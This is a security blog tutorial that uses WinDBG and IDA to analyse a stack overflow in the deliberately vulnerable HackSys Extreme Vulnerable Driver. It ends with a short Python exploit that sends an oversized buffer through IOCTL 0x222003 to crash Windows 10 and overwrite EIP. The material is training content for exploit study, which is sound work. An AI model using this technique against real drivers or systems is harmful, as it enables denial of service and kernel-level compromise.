---
slug: hevd-dos/
title: 'HEVD: Denial of Service'
date: 2020-09-14
category: attacks
subtitle: How to crash Windows
tags: osee, training, exploit, windows, kernel, hevd
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-dos/cover_cnggzc.webp
alt: Photo by Chaozzy Lin on Unsplash
description: This article will be the first approach to start exploting
  HackSys Extremely Vulnerable Driver with a Denial of Service
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSEE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCE, OSCP, CHFI
about2: We don't need the key, we'll break — RATM
source: https://unsplash.com/photos/k8riOACwZDg
---

In the last [post](../windows-kernel-debugging/), we were able to set up
a lab environment to start exploiting vulnerabilities in the Windows
kernel space.

This article will focus on the first steps to exploit the
vulnerabilities on HackSys Extreme Vulnerable Driver (`HEVD`).

First, we need to get familiar with `WinDBG`, a very powerful debugger
from Microsoft with a steep learning curve. We’ll also use `IDA`,
specifically the freeware version, which is enough for most of what
we’re going to face.

In the end, we’re going to be able to crash our Windows 10 OS by
leveraging a vulnerability on `HEVD`. It’s nice to crash things for the
sake of science.

Let’s get our hands dirty\!

## WinDBG 101

Before dealing with the exploitation process, I will list some `WinDBG`
commands that have helped me. This is selfishly written as a reference
for myself but kindly shared with you.

- `g`: Short for `Go`. It will resume the execution of the debuggee.

<div class="imgblock">

![g
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/g1_tz1tgb.webp)

</div>

- `t`: Short for `Step Into`. It will execute the next instruction. If
  it’s a `call`, it will jump into the call content.

- `p`: Sort for `Step Over`. It will execute the next instruction. If
  it’s a `call`, it will execute whatever the call does and jump over
  it.

- `gu`: Short for `Step Out`. Will resume the execution until a `ret`
  instruction is found. Useful when you `Step Into` a function and
  want to return to the place it was called.

<div class="imgblock">

![execution flow
commands](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/deb1_nho4cy.webp)

</div>

- `d*` family: Short for `Display Memory`. It will dump the contents
  of a given memory address. The most useful variation on 32 bits
  debugging is `dc` (dump double-word and ASCII chars).

<div class="imgblock">

![dt
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/dc1_jash41.webp)

</div>

- `lm`: Short for `List Loaded Modules`. You can filter the output
  using `lm m <module>`.

<div class="imgblock">

![lm
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330908/blog/hevd-dos/lm1_enljxt.webp)

</div>

<div class="imgblock">

![lm m \<module\>
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330906/blog/hevd-dos/lm2_eouttf.webp)

</div>

- `dt`: Short for `Display Type`. It is used to list data structures.

<div class="imgblock">

![dt
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330906/blog/hevd-dos/dt1_vbu2ot.webp)

</div>

- `r`: Short for `Registers`. It will show the value of all the
  processor registers and flags. It’s also used to change the value of
  a register.

<div class="imgblock">

![r
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330906/blog/hevd-dos/r1_s2jzj9.webp)

</div>

- `u`: Short for `Unassemble`. It will show the instructions at the
  given memory address.

<div class="imgblock">

![u
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330908/blog/hevd-dos/u1_fp4xip.webp)

</div>

- `x`: Short for `Examine Symbols`. It will show the symbols at a
  given module.

<div class="imgblock">

![x
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-dos/x1_f0wxnj.webp)

</div>

- `e*` family: Short for `Enter Values`. It will enter a given value
  to a specified memory location. The most used variation on 32 bits
  debugging is `ed` (enter double-word value).

<div class="imgblock">

![ed
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330906/blog/hevd-dos/ed1_fd7mct.webp)

</div>

- `?`: Evaluate expression.

<div class="imgblock">

![?
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330908/blog/hevd-dos/quest1_wtsnn3.webp)

</div>

- `bp`: Short for `Breakpoint`. It will set a software breakpoint at a
  given address.

- `bl`: Short for `List Breakpoints`. It will list current
  breakpoints.

- `bc`: Short for `Clear Breakpoint`. It will remove breakpoints.

<div class="imgblock">

![?
command](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/bp1_kh0l6w.webp)

</div>

This is by no means a comprehensive `WinDBG` reference but will show the
commands I use the most when debugging.

## Talking to Windows drivers

The common main goal of Windows Kernel exploitation is to elevate
privileges to perform any desired task on the affected computer with the
most powerful permissions. We do that by finding a vulnerability in a
piece of code running at kernel-space and establishing a communication
between the exploit in user-mode and the target in kernel-mode, which is
where the drivers live.

As Windows runs in protected mode, user-land instructions cannot access
to kernel-space memory. However, there is an interface provided by the
OS that allows talking to drivers: `IOCTL` calls.

When a driver is installed, it sets a device name using the
`IoCreateDevice` call.

<div class="imgblock">

![IoCreateDevice](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-dos/iocreatedevice1_jbuhha.webp)

</div>

It then defines the routines that will expose. Commonly, those routines
are basically functions that will interact with other layers of the OS
(Hardware Abstraction Layer or `HAL`, for example) to manipulate a
hardware device. In `HEVD`, those routines are functions happening at
kernel-level with several vulnerabilities.

Each routine is identified by an `IOCTL` (I/O control) code.

The driver will accept calls to that routines using `IRP` (I/O Request
Packets) structures and will set a handler that will dispatch the
specific routine, given a specific `IOCTL` code:

<div class="imgblock">

![IrpHandler](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-dos/iohandler1_qmt9l5.webp)

</div>

The `IrpDeviceIoCtlHandler` function in `HEVD` creates a jump table
(like a `switch` statement) for each managed `IOCTL` code:

<div class="imgblock">

![JMP
table](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330906/blog/hevd-dos/jmptable1_zih7lj.webp)

</div>

In `HEVD`, each `case` of that `switch` statement is handled by another
function that will trigger a specific vulnerable function:

<div class="imgblock">

![JMP
table](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/jmptable2_pe1rxr.webp)

</div>

Now, if we want to talk to that driver, we must get a handle on the
driver’s device name, which is `HackSysExtremeVulnerableDrive` in the
case of `HEVD`, and use the `DeviceIoControl` function to send the
`IOCTL` code we want, along with the payload.

In Python, there’s a third-party package called `infi.wioctl` that wraps
those calls nicely:

``` python
from infi.wioctl import DeviceIoControl

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_CODE, PAYLOAD, SIZE, 0, 0)
```

With that, we can start looking for our first vulnerability on `HEVD`.

## HEVD stack overflow

`HEVD` has several vulnerabilities built-in. In this post, we will
discover the most basic, a stack overflow.

When we look at the jump table generated by the `IrpDeviceIoCtlHandler`
function, the first case is this:

<div class="imgblock">

![Case
1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330908/blog/hevd-dos/case1_dmru9e.webp)

</div>

It is triggered when the `IOCTL` code is `2236419` decimal or `0x222003`
in hex. Here, a call to `BufferOverflowStackIoctlHandler` is performed.

Inside `BufferOverflowStackIoctlHandler`, there is a check verifying if
the `IRP` package contains user-supplied data. If it does, a call to
`TriggerBufferOverflowStack` is performed:

<div class="imgblock">

![BufferOverflowStackIoctlHandler](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/buffhandler1_unkrn3.webp)

</div>

You can also note that the pointer to the user data is placed on `EDX`
and the pointer to the size of the user data is placed on `EAX`. That
information is then pushed to the stack as the parameters for
`TriggerBufferOverflowStack`. You can see the same in the source code of
`HEVD`:

``` cpp
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }

    return Status;
}
```

In the `TriggerBufferOverflowStack` function, the first important thing
to notice is that a `memset(&KernelBuffer, 0, 800h)` call is done:

<div class="imgblock">

![TriggerBufferOverflowStack](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330907/blog/hevd-dos/trigger1_c4fsed.webp)

</div>

This indicates that the buffer is `800h` or `2048` bytes long.

In the end of `TriggerBufferOverflowStack`, a call to
`memcpy(&KernelBuffer, &UserBuffer, SizeOfUserBuffer)` is performed,
which is a classic example of buffer overflow because we control both
the `UserBuffer` data and the `SizeOfUserBuffer` value:

<div class="imgblock">

![TriggerBufferOverflowStack](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-dos/trigger2_ft4sgf.webp)

</div>

Great, it means that if we wanted to overflow the `KernelBuffer`
variable, we should inject a payload with more than 2048 bytes, using
the `IOCTL` code `0x222003`. Let’s create our exploit:

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow DoS.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-dos/
"""

from infi.wioctl import DeviceIoControl

DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'

IOCTL_HEVD_STACK_OVERFLOW = 0x222003
SIZE = 3000

PAYLOAD = (
    b'A' * SIZE
)

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
```

And check it:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330908/blog/hevd-dos/success1_orbdny.gif)

</div>

Great\! We were able to overwrite `EIP` with our `A` buffer\! Now the
target machine is completely unusable and our `DoS` attack was
successful.

Also, as we could evidence in our previous [exploitation
posts](../tags/osce/), we control the execution flow when we control
`EIP`.

## Conclusions

This post was intended to cover the first part for interacting with a
Windows driver, and we were able to perform a full Denial of Service of
the victim machine. In the next post, we will use the proven ability to
control the execution flow to [execute code at
kernel-level](../hevd-smep-bypass/).
